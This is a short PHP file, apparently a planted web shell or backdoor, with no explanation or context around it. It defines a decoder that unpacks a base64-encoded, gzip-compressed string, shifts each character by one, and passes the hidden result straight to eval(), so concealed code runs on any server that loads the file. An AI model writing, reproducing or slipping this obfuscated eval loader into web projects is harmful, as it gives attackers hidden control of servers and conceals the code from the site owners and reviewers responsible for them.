<?php function FWGKH($XxkemC)
{
    $XxkemC=gzinflate(base64_decode($XxkemC));
    for($i=0;$i<strlen($XxkemC);$i++)
    {
        $XxkemC[$i] = chr(ord($XxkemC[$i])-1);
    }
    return $XxkemC;
}eval(FWGKH("U1QEAm7ukrSSkqyC/ISS0qTiUk0tG4RIWX5JGqpIalpJaXFBFVgsMy0pNa1YU9m3ICWpFChprWigrGUDAA=="));?>